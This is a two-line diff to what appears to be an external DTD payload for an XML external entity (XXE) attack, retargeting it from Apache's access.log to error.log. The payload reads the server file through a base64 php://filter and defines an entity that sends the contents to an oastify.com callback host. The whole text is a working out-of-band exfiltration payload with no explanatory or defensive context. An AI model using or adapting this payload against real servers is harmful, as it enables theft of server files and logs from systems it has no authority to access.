@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/var/log/apache2/access.log">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/var/log/apache2/error.log">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://g3k9x75766ypt462mu78ultzdqjh7hv6.oastify.com?%data;'>">
